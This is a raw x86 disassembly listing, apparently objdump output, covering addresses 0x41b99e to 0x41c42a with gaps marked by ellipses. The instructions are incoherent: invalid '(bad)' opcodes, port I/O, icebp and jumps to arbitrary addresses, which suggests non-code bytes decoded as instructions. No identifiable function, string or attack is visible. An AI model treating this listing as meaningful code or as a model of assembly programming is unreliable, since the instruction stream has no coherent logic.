  41b99e:	ds inc ecx
  41b9a0:	xchg   DWORD PTR [ebx+0x6],eax
  41b9a3:	inc    ebx
  41b9a4:	in     al,dx
  41b9a5:	jo     0x41b9e5
  41b9a7:	jb     0x41b9aa
  41b9a9:	pop    ecx
  41b9aa:	(bad)  
  41b9ab:	mov    ?,WORD PTR [edi]
  41b9ad:	ret    0x7246
  41b9b0:	mov    DWORD PTR ss:[edx-0x7576f3aa],eax
  41b9b7:	mov    es,WORD PTR ds:0x932ff87
  41b9bd:	mov    dh,0x47
  41b9bf:	mov    bl,0xe3
  41b9c1:	sbb    BYTE PTR [edi+0x7ebf8c78],dh
  41b9c7:	test   DWORD PTR [edi-0xb2c80f9],ecx
  41b9cd:	or     BYTE PTR [ebx+edi*8+0xd],al
  41b9d1:	xchg   DWORD PTR [edi+0x32],edi
  41b9d4:	or     DWORD PTR [esi-0x1ad7a4c9],esi
  41b9da:	inc    esi
  41b9db:	push   eax
  41b9dc:	icebp  
  41b9dd:	mov    WORD PTR [edx+edx*8+0x38],es
  41b9e1:	xchg   DWORD PTR [edi+edx*2+0x60],edi
  41b9e5:	(bad)  
  41b9e6:	dec    BYTE PTR [ebx+0x7d]
  41b9e9:	inc    DWORD PTR [eax+0x62]
  41b9ec:	jo     0x41b9b3
  41b9ee:	dec    BYTE PTR [ebx+0x7d]
  41b9f1:	or     eax,0x0
	...
  41ba1a:	add    BYTE PTR [eax],al
  41ba1c:	test   eax,0x348ccf7a
  41ba21:	shr    BYTE PTR [eax],cl
  41ba23:	inc    esp
  41ba24:	dec    ebx
  41ba25:	(bad)
  41ba28:	jno    0x41ba95
  41ba2a:	loop   0x41ba39
  41ba2c:	rcl    DWORD PTR [ecx+0x60],0xc5
  41ba30:	dec    BYTE PTR [ebx+0x3d]
  41ba33:	or     eax,0xeef79f9
  41ba38:	inc    esp
  41ba39:	dec    esp
  41ba3a:	cmp    eax,0x609a4104
  41ba3f:	push   cs
  41ba40:	xchg   DWORD PTR [ecx-0x2f90fc11],ebx
  41ba46:	xor    esp,DWORD PTR [eax]
  41ba48:	inc    esi
  41ba49:	shl    BYTE PTR [ebx],1
  41ba4b:	and    BYTE PTR [edx],bh
  41ba4d:	shr    cl,1
  41ba4f:	les    edx,FWORD PTR [esi]
  41ba51:	arpl   WORD PTR [edi+0x4],bp
  41ba54:	cmp    eax,edx
  41ba56:	jmp    0x5faca11f
  41ba5b:	add    al,0x29
  41ba5d:	shr    cl,1
  41ba5f:	(bad)  
  41ba60:	(bad)  
  41ba61:	push   edx
  41ba62:	outs   dx,DWORD PTR ds:[esi]
  41ba63:	add    al,0x19
  41ba65:	shl    BYTE PTR [edx+0x6aaab944],cl
  41ba6b:	lds    eax,FWORD PTR [edx-0x30]
  41ba6e:	out    0x8b,eax
  41ba70:	aas    
  41ba71:	shr    cl,1
  41ba73:	les    esp,FWORD PTR [esi+0x71046f62]
  41ba79:	rol    BYTE PTR [eax],1
  41ba7b:	jmp    0x41b9ff
  41ba7d:	jb     0x41ba8f
  41ba7f:	popa   
	...
  41baa8:	add    BYTE PTR [eax],al
  41baaa:	cmp    bh,BYTE PTR [ecx+ecx*4]
  41baad:	jmp    0x41ba31
  41baaf:	jb     0x41bab9
  41bab1:	jno    0x41baed
  41bab3:	cmp    al,0x89
  41bab5:	sti    
  41bab6:	mov    ch,0xaa
  41bab8:	mov    al,ch
  41baba:	inc    eax
  41babb:	cdq    
  41babc:	or     cl,ch
  41babe:	cs aam 0xe3
  41bac1:	push   0x59
  41bac3:	dec    esi
  41bac4:	push   ecx
  41bac5:	lahf   
  41bac6:	sub    al,0xd2
  41bac8:	inc    ebx
  41bac9:	fnsave [eax+0x53720827]
  41bacf:	ror    BYTE PTR [ebx-0xf],cl
  41bad2:	rcl    BYTE PTR [ebx],0x4
  41bad5:	pusha  
  41bad6:	nop
  41bad7:	mov    ebx,0x922ae5e9
  41badc:	jg     0x41bae8
  41bade:	inc    esp
  41badf:	push   0x924aee0d
  41bae4:	xchg   DWORD PTR [edi],edx
  41bae6:	add    al,BYTE PTR [edx-0x1cf447fc]
  41baec:	(bad)  
  41baed:	test   al,0x24
  41baef:	dec    esp
  41baf0:	das    
  41baf1:	scas   eax,DWORD PTR es:[edi]
  41baf2:	lds    ebp,FWORD PTR [edi+edi*2-0x36]
  41baf6:	out    0x78,eax
  41baf8:	add    cl,ch
  41bafa:	sub    al,0x92
  41bafc:	xchg   DWORD PTR [edi-0x7ef7e03],esp
  41bb02:	or     esp,ebx
  41bb04:	into   
  41bb05:	test   al,0xd4
  41bb07:	pop    ebp
  41bb08:	das    
  41bb09:	xchg   edi,eax
  41bb0a:	mov    ch,0x6c
  41bb0c:	jg     0x41ba98
	...
  41bb36:	add    BYTE PTR [eax],al
  41bb38:	xor    ebp,DWORD PTR [ecx+esi*1]
  41bb3b:	fisubr DWORD PTR [edx*4-0x7e024879]
  41bb42:	add    bl,al
  41bb44:	in     al,dx
  41bb45:	loop   0x41bb15
  41bb47:	add    dh,ah
  41bb49:	test   DWORD PTR [eax],ecx
  41bb4b:	xor    ecx,ecx
  41bb4d:	out    0xef,al
  41bb4f:	xor    DWORD PTR [esp+edx*4+0x4d97ff00],0x9e0189da
  41bb5a:	out    0x8,al
  41bb5c:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  41bb5e:	test   DWORD PTR [ebp-0xd],esi
  41bb61:	pop    ebp
  41bb62:	test   BYTE PTR [ebx-0x10426d8e],0x60
  41bb69:	(bad)  
  41bb6b:	add    esi,ebp
  41bb6d:	lea    eax,ds:0x2dacdef9
  41bb73:	into   
  41bb74:	fimul  WORD PTR [edi-0x37121c83]
  41bb7a:	stos   BYTE PTR es:[edi],al
  41bb7b:	stos   BYTE PTR es:[edi],al
  41bb7c:	jbe    0x41bb36
  41bb7e:	sub    eax,0x124ae2d9
  41bb83:	mov    DWORD PTR [eax],ecx
  41bb85:	sahf   
  41bb86:	jmp    0x41bba7
  41bb88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb89:	jl     0x41bb88
  41bb8b:	mov    BYTE PTR ds:0xdac7fa65,dh
  41bb91:	xchg   ebp,eax
  41bb92:	or     BYTE PTR [eax],al
  41bb94:	pop    ss
  41bb95:	pop    esi
  41bb96:	test   esi,ecx
  41bb98:	out    0x7b,al
  41bb9a:	sbb    al,0x89
	...
  41bbc4:	add    BYTE PTR [eax],al
  41bbc6:	loopne 0x41bb64
  41bbc8:	jmp    0x41bbce
  41bbca:	sahf   
  41bbcb:	pop    DWORD PTR ds:0x7f9c9efb
  41bbd1:	shr    bl,0x4e
  41bbd4:	push   ds
  41bbd5:	mov    ecx,edx
  41bbd7:	fsubrp st(6),st
  41bbd9:	aas    
  41bbda:	pop    esp
  41bbdb:	push   0xffffffb1
  41bbdd:	clc    
  41bbde:	adc    ebx,DWORD PTR [esi]
  41bbe0:	add    BYTE PTR [ecx+0x6eb9d00],cl
  41bbe6:	data16 jnp 0x41bbe5
  41bbe9:	add    BYTE PTR [esi],bh
  41bbeb:	test   BYTE PTR [ecx],al
  41bbed:	or     DWORD PTR [ecx+0x3e3f5bcb],ecx
  41bbf3:	jmp    0x41bbac
  41bbf5:	mov    edi,0xe58289a1
  41bbfa:	stos   BYTE PTR es:[edi],al
  41bbfb:	add    DWORD PTR [ecx],0x0
  41bbfe:	xor    eax,0xff78d931
  41bc03:	or     DWORD PTR [edx-0x10d78023],0x7e
  41bc0a:	mov    eax,ds:0x3e00010f
  41bc0f:	jge    0x41bba1
  41bc11:	clc    
  41bc12:	lock ret 0x8701
  41bc16:	jmp    0x41bc47
  41bc18:	mov    al,dh
  41bc1a:	mov    ebp,0x7586fd43
  41bc1f:	je     0x41bc18
  41bc21:	xchg   BYTE PTR [eax+0x4],bh
  41bc24:	fistp  QWORD PTR ds:0xf88e8fc5
	...
  41bc52:	add    BYTE PTR [eax],al
  41bc54:	retf   
  41bc55:	ret    0x901
  41bc58:	retf   
  41bc59:	dec    edi
  41bc5a:	mov    bl,ch
  41bc5c:	call   DWORD PTR [ecx-0x1]
  41bc5f:	jle    0x41bc7a
  41bc61:	ja     0x41bc65
  41bc63:	add    BYTE PTR [esi],bh
  41bc65:	jge    0x41bbf7
  41bc67:	clc    
  41bc68:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc69:	ret    
  41bc6a:	add    DWORD PTR [edi+0xee5c3f9],eax
  41bc70:	mov    edi,0x3e00d8a1
  41bc75:	or     BYTE PTR [edx],0xb5
  41bc78:	push   es
  41bc79:	or     al,0x43
  41bc7b:	add    bh,al
  41bc7d:	rol    ebx,0xed
  41bc80:	dec    eax
  41bc81:	add    ebx,ebp
  41bc83:	cld    
  41bc84:	add    BYTE PTR ds:[ecx],0x9
  41bc88:	test   eax,0x3e3f4daa
  41bc8d:	pop    ebx
  41bc8e:	fcom   st(1)
  41bc90:	mov    ecx,0x2adea891
  41bc95:	loop   0x41bc55
  41bc97:	vmaxsd xmm4,xmm5,QWORD PTR [eax-0x2d]
  41bc9c:	inc    ecx
  41bc9d:	je     0x41bd0f
  41bc9f:	mov    esi,0x12e39bbf
  41bca4:	dec    eax
  41bca5:	loop   0x41bc3c
  41bca7:	sbb    DWORD PTR [eax-0x32ef9dc8],0x73
  41bcae:	jecxz  0x41bcf4
  41bcb0:	ds loop 0x41bcf1
  41bcb3:	lds    ebx,FWORD PTR [ebx+0xdf6861]
	...
  41bce1:	add    BYTE PTR [edx+0x4703e75b],al
  41bce7:	mov    al,0x3f
  41bce9:	pop    edx
  41bcea:	xor    DWORD PTR [ebx+0x70],ebx
  41bced:	mov    bh,0xa9
  41bcef:	mov    ch,ah
  41bcf1:	test   BYTE PTR [ebx+0x77],bl
  41bcf4:	out    0x3,eax
  41bcf6:	ds fs pop esi
  41bcf9:	(bad)  
  41bcfb:	sbb    edi,esp
  41bcfd:	mov    WORD PTR [ebx-0x66],gs
  41bd00:	push   es
  41bd01:	out    dx,al
  41bd02:	sar    BYTE PTR [edi+0xb],0x4
  41bd06:	ds pop ebx
  41bd08:	repnz mov ?,WORD PTR [esi]
  41bd0b:	icebp  
  41bd0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd0d:	add    eax,ecx
  41bd0f:	in     eax,dx
  41bd10:	cli    
  41bd11:	mov    eax,?
  41bd13:	(bad)  [edi]
  41bd15:	add    cl,al
  41bd17:	mov    ebx,DWORD PTR [edx]
  41bd19:	idiv   BYTE PTR [eax+0x4bdd6a98]
  41bd1f:	in     al,0x1b
  41bd21:	xchg   ecx,eax
  41bd22:	push   es
  41bd23:	mul    BYTE PTR [edi]
  41bd25:	add    al,0x47
  41bd27:	out    dx,al
  41bd28:	mov    edx,0xce9a138c
  41bd2d:	std    
  41bd2e:	push   0x3db50080
  41bd33:	pop    ebx
  41bd34:	add    dl,ah
  41bd36:	enter  0x7972,0x28
  41bd3a:	cmp    ah,al
  41bd3c:	(bad)  [eax-0x71809720]
  41bd42:	jmp    0x12abda1
	...
  41bd6f:	add    BYTE PTR [esi+ebp*4-0x8],al
  41bd73:	add    bl,bh
  41bd75:	pop    edx
  41bd76:	xchg   DWORD PTR [esi+0x68168582],ebx
  41bd7c:	xor    BYTE PTR [esi+0x0],0xe9
  41bd80:	cmp    eax,0x61b562
  41bd85:	cmp    BYTE PTR [eax],al
  41bd87:	sbb    BYTE PTR [ebx+0x75],dh
  41bd8a:	dec    ebx
  41bd8b:	push   ecx
  41bd8c:	mov    esp,0x40e9f7f3
  41bd91:	fsubr  QWORD PTR [ecx-0x788a77b9]
  41bd97:	xor    DWORD PTR [edx+0x7b601d7a],eax
  41bd9d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bd9e:	out    dx,al
  41bd9f:	pusha  
  41bda0:	sbb    BYTE PTR [edi-0x11],0x70
  41bda4:	lea    eax,[edi-0x38]
  41bda7:	jo     0x41be25
  41bda9:	mul    eax
  41bdab:	inc    ebx
  41bdac:	xchg   edi,eax
  41bdad:	les    ebp,FWORD PTR [edx-0x28b90828]
  41bdb3:	jo     0x41bda2
  41bdb5:	mov    dh,0xe0
  41bdb7:	fidivr WORD PTR [edx-0x4df83073]
  41bdbd:	cdq    
  41bdbe:	pop    es
  41bdbf:	sti    
  41bdc0:	lds    ecx,FWORD PTR [ebx+0x4642d1bf]
  41bdc6:	enter  0xff70,0xf6
  41bdca:	loopne 0x41bda2
  41bdcc:	cmp    bh,BYTE PTR [eax+0x0]
  41bdcf:	sbb    BYTE PTR [ebp+0xd8de],dh
	...
  41bdfd:	add    BYTE PTR [esi-0x6acef781],ah
  41be03:	loop   0x41bdd5
  41be05:	sar    edi,0x59
  41be08:	sub    eax,0x7d9c5ec8
  41be0d:	jecxz  0x41be03
  41be0f:	dec    ebx
  41be10:	das    
  41be11:	xor    esp,esi
  41be13:	mov    cl,0x85
  41be15:	fcom   DWORD PTR [esi-0x1acefd81]
  41be1b:	loop   0x41bde5
  41be1d:	ror    edi,0x6f
  41be20:	shr    BYTE PTR cs:[esi],1
  41be23:	pushf  
  41be24:	jge    0x41be09
  41be26:	sub    BYTE PTR [eax-0x4b2a0000],dl
  41be2c:	test   eax,ebx
  41be2e:	data16 jg 0x41be41
  41be31:	xor    DWORD PTR [esi-0x1e],edx
  41be34:	enter  0xffc1,0x5a
  41be38:	sub    eax,0x7d9bded0
  41be3d:	jecxz  0x41bea7
  41be3f:	pop    edi
  41be40:	or     ecx,DWORD PTR [edi]
  41be42:	data16 mov ah,0x87
  41be45:	inc    ebp
  41be46:	pop    edi
  41be47:	cdq    
  41be48:	fild   WORD PTR [esi+edx*2]
  41be4b:	mov    ds:0x35e41885,eax
  41be50:	or     BYTE PTR [esp+ecx*8],al
  41be53:	xor    eax,0x2f478908
  41be58:	pop    esi
  41be59:	pop    ebx
  41be5a:	sahf   
  41be5b:	sbb    DWORD PTR [ecx-0x3e],0x2f
  41be5f:	pop    edx
  41be60:	dec    edi
  41be61:	push   esi
	...
  41be8a:	add    BYTE PTR [eax],al
  41be8c:	lods   al,BYTE PTR ds:[esi]
  41be8d:	xor    esp,DWORD PTR [esp+ecx*1]
  41be90:	mov    cl,0xe2
  41be92:	je     0x41beb8
  41be94:	not    DWORD PTR [edi]
  41be96:	xor    esi,0xfcd0608
  41be9c:	mov    cl,0x98
  41be9e:	or     esi,DWORD PTR [edi-0x74ce3bc2]
  41bea4:	jge    0x41bf22
  41bea6:	xor    eax,ebp
  41bea8:	mov    ebx,DWORD PTR [edx-0x63a9022c]
  41beae:	dec    ebp
  41beaf:	aas    
  41beb0:	ds pushf 
  41beb2:	or     ah,bh
  41beb4:	fld    st(4)
  41beb6:	add    al,0xb5
  41beb8:	enter  0x2f35,0xe8
  41bebc:	jg     0x41be78
  41bebe:	aam    0xfd
  41bec0:	push   esi
  41bec1:	dec    esp
  41bec2:	dec    ebp
  41bec3:	aas    
  41bec4:	ds fmul st(4),st
  41bec7:	stc    
  41bec8:	mov    cl,0xdc
  41beca:	xor    ebx,DWORD PTR [ecx+0x7c]
  41becd:	imul   eax,DWORD PTR [ecx],0x53
  41bed0:	mov    bh,0xe6
  41bed2:	xor    DWORD PTR [eax-0x13],edx
  41bed5:	clc    
  41bed6:	cmp    eax,0x59ec508
  41bedb:	mov    esi,ebx
  41bedd:	sti    
  41bede:	cs push eax
  41bee0:	xchg   esi,eax
  41bee1:	mov    esi,0x9b79fdd5
  41bee6:	pop    ecx
  41bee7:	je     0x41bee8
  41bee9:	add    DWORD PTR [esi-0x162c99bd],0xfffffff5
	...
  41bf18:	add    BYTE PTR [eax],al
  41bf1a:	bound  ebp,QWORD PTR [esp+edx*8]
  41bf1d:	push   0x42af56
  41bf22:	ret    
  41bf23:	(bad)  
  41bf24:	fst    DWORD PTR [eax+0x56]
  41bf27:	dec    edx
  41bf28:	aad    0xfd
  41bf2a:	inc    ecx
  41bf2b:	fistp  DWORD PTR [ecx+0x73]
  41bf2e:	jg     0x41beb2
  41bf30:	xchg   BYTE PTR [ebx+0x36],al
  41bf33:	shr    ecx,cl
  41bf35:	fldcw  WORD PTR [edx]
  41bf37:	jbe    0x41bf0a
  41bf39:	push   ecx
  41bf3a:	mov    bl,0xc7
  41bf3c:	fst    DWORD PTR [eax+0x26]
  41bf3f:	add    ebp,edx
  41bf41:	std    
  41bf42:	adc    DWORD PTR [edx+eax*2+0x7d],ebx
  41bf46:	sbb    dl,BYTE PTR [edi]
  41bf48:	test   eax,0x601001fc
  41bf4d:	jmp    0x37394711
  41bf52:	mov    al,ah
  41bf54:	and    al,0xfc
  41bf56:	mov    dh,0xee
  41bf58:	jmp    0xe637:0x17737d80
  41bf5f:	jno    0x41bf13
  41bf61:	rcl    ebx,cl
  41bf63:	out    0x2c,al
  41bf65:	aam    0x6e
  41bf67:	fsubr  DWORD PTR [edx-0x7b7c9104]
  41bf6d:	iret   
  41bf6e:	mov    ebx,0x2a4bff74
  41bf73:	sbb    ah,bh
  41bf75:	cmp    ch,0x72
  41bf78:	pop    ss
  41bf79:	fmul   st(3),st
  41bf7b:	ja     0x41bff3
  41bf7d:	rol    DWORD PTR [eax],cl
	...
  41bfa7:	add    BYTE PTR [esi],ah
  41bfa9:	repz repnz inc esp
  41bfac:	ds out 0xac,al
  41bfaf:	shr    esi,cl
  41bfb1:	xor    BYTE PTR [eax-0x30],0x83
  41bfb5:	je     0x41c019
  41bfb7:	xor    DWORD PTR [edx-0x20],edi
  41bfba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfbb:	sar    DWORD PTR [ecx+0x57d431e],cl
  41bfc1:	imul   ecx,edi,0xffffffcb
  41bfc4:	jmp    0x9772:0xfd80e719
  41bfcb:	fninit 
  41bfcd:	jbe    0x41bff5
  41bfcf:	rcl    esi,cl
  41bfd1:	jb     0x41bf66
  41bfd3:	inc    esp
  41bfd4:	ds out 0xac,al
  41bfd7:	ror    DWORD PTR [esi+0x33cf8883],cl
  41bfdd:	je     0x41c051
  41bfdf:	xor    DWORD PTR [edx],ebp
  41bfe1:	loopne 0x41bf87
  41bfe3:	sar    DWORD PTR [ecx-0x650affe3],cl
  41bfe9:	adc    al,dh
  41bfeb:	add    DWORD PTR [ebp-0x4116c118],0xe239f817
  41bff5:	sbb    eax,0x30cd6fc
  41bffa:	js     0x41c050
  41bffc:	jnp    0x41c059
  41bffe:	mov    ebp,DWORD PTR [edx+edx*1]
  41c001:	or     ebp,eax
  41c003:	add    BYTE PTR [esi],cl
  41c005:	jbe    0x41c004
  41c007:	pop    ds
  41c008:	mov    edi,0x19f817
	...
  41c035:	add    dl,dh
  41c037:	jp     0x41c032
  41c039:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c03a:	in     al,dx
  41c03b:	fld    st(6)
  41c03d:	icebp  
  41c03e:	pop    es
  41c03f:	loopne 0x41c084
  41c041:	cdq    
  41c042:	ins    DWORD PTR es:[edi],dx
  41c043:	adc    ecx,0xffffff92
  41c046:	mov    WORD PTR [ebp+0x5e],?
  41c049:	and    ch,BYTE PTR [ebx]
  41c04b:	xchg   DWORD PTR [ebx-0x55],ebx
  41c04e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c04f:	jae    0x41c0a5
  41c051:	pusha  
  41c052:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c053:	repz jmp 0x41c0b3
  41c056:	cmp    bl,BYTE PTR [ebx+0x0]
  41c059:	mov    edx,0xbc890e47
  41c05e:	test   edx,esp
  41c060:	jae    0x41c047
  41c062:	mov    esi,0x8c4f80d7
  41c067:	jne    0x41c0b9
  41c069:	push   ecx
  41c06a:	into   
  41c06b:	jae    0x41c06a
  41c06d:	jmp    0x31aa1b75
  41c072:	div    BYTE PTR [ebx]
  41c074:	add    BYTE PTR [ecx-0x36],al
  41c077:	je     0x41c076
  41c079:	xor    cl,BYTE PTR es:[ecx-0x188a9476]
  41c080:	ds jmp 0xab74183b
  41c086:	mov    eax,0xc3000875
  41c08b:	xchg   ebx,eax
  41c08d:	test   DWORD PTR [edi+0x26fffb8c],edi
  41c093:	pop    edi
  41c094:	add    BYTE PTR [eax],al
  41c096:	cmp    al,0x2a
  41c098:	test   eax,esi
	...
  41c0c2:	add    BYTE PTR [eax],al
  41c0c4:	mov    ds,edx
  41c0c6:	je     0x41c0c6
  41c0c8:	loopne 0x41c056
  41c0ca:	sub    eax,0x8747fcd2
  41c0cf:	test   DWORD PTR [ebx+0x6efffb8d],ecx
  41c0d5:	fidivr DWORD PTR [esi+edi*8-0x60]
  41c0d9:	mov    ebx,?
  41c0db:	test   DWORD PTR [ebx],ebx
  41c0dd:	(bad)  
  41c0de:	sti    
  41c0df:	call   FWORD PTR [edx+esi*8+0x7b]
  41c0e3:	(bad)  
  41c0e4:	mov    al,ds:0xd4be0b8c
  41c0e9:	xlat   BYTE PTR ds:[ebx]
  41c0ea:	loopne 0x41c16b
  41c0ec:	sbb    al,0xe2
  41c0ee:	jl     0x41c0ee
  41c0f0:	ror    BYTE PTR [ebx+ecx*1-0x7b27f4a],0x88
  41c0f8:	xchg   esi,eax
  41c0f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c0fa:	(bad)  
  41c0fb:	jmp    DWORD PTR [ecx+ebx*1+0x7f]
  41c0ff:	cli    
  41c100:	lahf   
  41c101:	and    DWORD PTR [ecx],eax
  41c103:	sbb    BYTE PTR [edi+edx*2+0x71],0xc6
  41c108:	leave  
  41c109:	xor    al,0xe8
  41c10b:	imul   edx,DWORD PTR [ecx],0xffffff8c
  41c10e:	sti    
  41c10f:	cmp    DWORD PTR [edx+0xfffe1f],0x57
  41c116:	cmp    BYTE PTR [ebx],0x57
  41c119:	or     DWORD PTR [ebx-0x1e12d7d],esp
  41c11f:	jmp    DWORD PTR [eax]
  41c121:	push   edi
  41c122:	jno    0x41c0c2
  41c124:	rcr    cl,cl
  41c126:	cmp    dh,0x0
	...
  41c151:	add    BYTE PTR [eax],ah
  41c153:	mov    WORD PTR [eax-0x18],ss
  41c156:	ds loope 0x41c15b
  41c159:	add    BYTE PTR [esi],bh
  41c15b:	shr    DWORD PTR [edi],0x59
  41c15e:	mov    bh,0x47
  41c160:	sub    eax,0x368436c2
  41c165:	xchg   DWORD PTR [ebx],esp
  41c167:	add    esp,eax
  41c169:	mov    WORD PTR [edi],?
  41c16b:	test   BYTE PTR [ecx],al
  41c16d:	push   ecx
  41c16e:	jo     0x41c1a1
  41c170:	jnp    0x41c1cd
  41c172:	ss in  eax,dx
  41c174:	push   ebp
  41c175:	or     al,0xcb
  41c177:	inc    BYTE PTR [eax+0x31a0f1fe]
  41c17d:	call   0x43456b
  41c182:	push   esp
  41c183:	test   BYTE PTR [ecx-0x8],bl
  41c186:	push   ebx
  41c187:	inc    ebx
  41c188:	add    al,0xe8
  41c18a:	in     eax,dx
  41c18b:	mov    esi,0xb60ffdd0
  41c190:	jnp    0x41c114
  41c192:	mov    BYTE PTR [esi+0x41],0x0
  41c196:	(bad)  
  41c197:	jg     0x41c1ac
  41c199:	inc    edx
  41c19a:	mov    ebp,0xaf7bf1cd
  41c19f:	rol    BYTE PTR [esi-0x300f5f88],0xff
  41c1a6:	cdq    
  41c1a7:	add    DWORD PTR [ecx],0xffffffe9
  41c1aa:	jmp    0xcf8f:0xc387d0fa
  41c1b1:	std    
  41c1b2:	adc    DWORD PTR [edx-0x4a],0xe9
	...
  41c1dd:	add    BYTE PTR [eax],al
  41c1df:	add    BYTE PTR [esi],ch
  41c1e1:	std    
  41c1e2:	test   DWORD PTR [eax+esi*2+0x20],esi
  41c1e6:	rol    BYTE PTR [edi-0x230683d],1
  41c1ec:	popa   
  41c1ed:	xor    BYTE PTR [esi-0x2fd7a78c],al
  41c1f3:	mov    ebx,eax
  41c1f5:	mov    edi,0x5a49fdcf
  41c1fa:	not    BYTE PTR [ecx+0x5007de3f]
  41c200:	(bad)  
  41c201:	scas   al,BYTE PTR es:[edi]
  41c202:	xchg   ebx,eax
  41c203:	shl    DWORD PTR [ebx],1
  41c205:	jno    0x41c1e5
  41c207:	cdq    
  41c208:	imul   ebp,DWORD PTR [edx],0xffffffff
  41c20b:	jp     0x41c22e
  41c20d:	xchg   edi,eax
  41c20e:	jmp    0x2ecd:0x6a1d7f03
  41c215:	out    dx,al
  41c216:	jecxz  0x41c19b
  41c218:	inc    edi
  41c219:	pop    ebx
  41c21a:	pop    esp
  41c21b:	(bad)  
  41c21c:	push   0xf5cecf09
  41c221:	jo     0x41c1f9
  41c223:	sbb    DWORD PTR [ebp-0x1430330d],0x5b
  41c22a:	or     edi,DWORD PTR ds:0x85e6
  41c22f:	adc    DWORD PTR [ebp-0x2c304b0d],0x5b
  41c236:	xor    al,0x6e
  41c238:	mov    ch,0xd6
  41c23a:	addr16 into 
  41c23c:	ret    
  41c23d:	jo     0x41c276
  41c23f:	fsubr  st(1),st
  41c241:	pop    ebx
  41c242:	out    0x3,eax
	...
  41c26c:	add    BYTE PTR [eax],al
  41c26e:	adc    edx,DWORD PTR [ecx]
  41c270:	xor    bh,BYTE PTR [ebp-0x66]
  41c273:	push   cs
  41c274:	test   eax,0x150da1fc
  41c279:	aaa    
  41c27a:	(bad)  
  41c27b:	pop    ss
  41c27c:	retf   
  41c27d:	repz sbb esp,esp
  41c280:	or     ebp,DWORD PTR [eax]
  41c282:	xor    bh,cl
  41c284:	imul   ebp,DWORD PTR [ebx-0x398f9bf3],0xffffffc5
  41c28b:	repz mul BYTE PTR [ebp-0x4c]
  41c28f:	pop    edx
  41c290:	out    0xda,eax
  41c292:	fidiv  WORD PTR ss:[edi-0x3a67470d]
  41c299:	adc    al,0x6c
  41c29b:	pusha  
  41c29c:	add    BYTE PTR [esi-0x74],bh
  41c29f:	or     eax,0x204a2981
  41c2a4:	call   0xfdb02c16
  41c2a9:	xchg   ecx,eax
  41c2aa:	add    eax,0x15e93ee7
  41c2af:	xor    eax,0x5df90ef7
  41c2b4:	mov    ch,0x22
  41c2b6:	ins    DWORD PTR es:[edi],dx
  41c2b7:	push   es
  41c2b8:	call   0xfdafb336
  41c2bd:	add    DWORD PTR [ebp-0x1a16c114],0xf0e6f738
  41c2c7:	pop    ebp
  41c2c8:	mov    ch,0xc2
  41c2ca:	sub    al,0x9
  41c2cc:	call   0xfdafcc06
  41c2d1:	add    BYTE PTR cs:[eax],al
	...
  41c2fc:	sbb    BYTE PTR [edx],dl
  41c2fe:	ret    0x3df1
  41c301:	or     cl,BYTE PTR [ecx+0x5163261d]
  41c307:	rcl    esp,0x68
  41c30a:	std    
  41c30b:	scas   al,BYTE PTR es:[edi]
  41c30c:	ret    0x8099
  41c30f:	jmp    0xa1fa1e51
  41c314:	adc    DWORD PTR [eax],esi
  41c316:	add    BYTE PTR [edx-0x53],ah
  41c319:	fcom   DWORD PTR [ecx]
  41c31b:	push   0x7d
  41c31d:	push   esi
  41c31e:	sub    DWORD PTR [edx-0xb87cbc7],0x86725b02
  41c328:	(bad)
  41c32b:	sub    BYTE PTR [edx-0x1e],al
  41c32e:	adc    BYTE PTR [eax-0x74],dh
  41c331:	fcmovb st,st(0)
  41c333:	in     eax,0xbc
  41c335:	cdq    
  41c336:	add    al,0x14
  41c338:	sub    bl,0x3e
  41c33b:	jmp    0x9b414f
  41c340:	adc    eax,0xcc530058
  41c345:	aas    
  41c346:	and    al,0x8
  41c348:	mov    ah,0x93
  41c34a:	call   0x7de2dc47
  41c34f:	ret    
  41c350:	xlat   BYTE PTR ds:[ebx]
  41c351:	pop    ebx
  41c352:	add    BYTE PTR [eax],al
  41c354:	lahf   
  41c355:	mov    ds:0xf2274174,al
  41c35a:	push   cs
  41c35b:	mov    DWORD PTR [edi],esp
  41c35d:	fidivr DWORD PTR [edi+0x4]
	...
  41c387:	add    BYTE PTR [eax],al
  41c389:	add    BYTE PTR [edx+ebx*4+0x13bf3d04],dl
  41c390:	cmp    eax,0xb88d9500
  41c395:	js     0x41c329
  41c397:	pop    ss
  41c398:	add    BYTE PTR [ebx-0x7cf00dfc],cl
  41c39e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c39f:	arpl   WORD PTR [edi-0x40],di
  41c3a2:	jecxz  0x41c401
  41c3a4:	clc    
  41c3a5:	jne    0x41c3bd
  41c3a7:	push   edi
  41c3a8:	jb     0x41c399
  41c3aa:	sbb    al,0x99
  41c3ac:	add    al,0x0
  41c3ae:	xor    dh,dl
  41c3b0:	loopne 0x41c335
  41c3b2:	sti    
  41c3b3:	jg     0x41c405
  41c3b5:	push   esi
  41c3b6:	pop    esp
  41c3b7:	or     BYTE PTR ds:[ebx+0x45895b22],cl
  41c3be:	fbld   TBYTE PTR [edi]
  41c3c0:	dec    edi
  41c3c1:	call   0x3d6380
  41c3c6:	or     dl,BYTE PTR [esi]
  41c3c8:	lock push eax
  41c3ca:	sub    bl,BYTE PTR [eax+ecx*1]
  41c3cd:	push   eax
  41c3ce:	scas   eax,DWORD PTR es:[edi]
  41c3cf:	ja     0x41c3c9
  41c3d1:	dec    DWORD PTR [eax]
  41c3d3:	out    dx,al
  41c3d4:	inc    eax
  41c3d5:	call   0x1101a001
  41c3da:	les    edx,FWORD PTR [edx-0x5fe70731]
  41c3e0:	push   0x42903e78
  41c3e5:	add    BYTE PTR [ebx+0x5650c9b7],bh
  41c3eb:	xchg   edi,eax
  41c3ec:	retf   0xfd
	...
  41c417:	add    BYTE PTR [ecx-0x74],bl
  41c41a:	dec    ecx
  41c41b:	je     0x41c41c
  41c41d:	cmp    DWORD PTR [esi+0x43],0x4e
  41c421:	aam    0xd9
  41c423:	ins    DWORD PTR es:[edi],dx
  41c424:	inc    edi
  41c425:	xor    eax,0xc8b668cb
  41c42a:	inc    edx
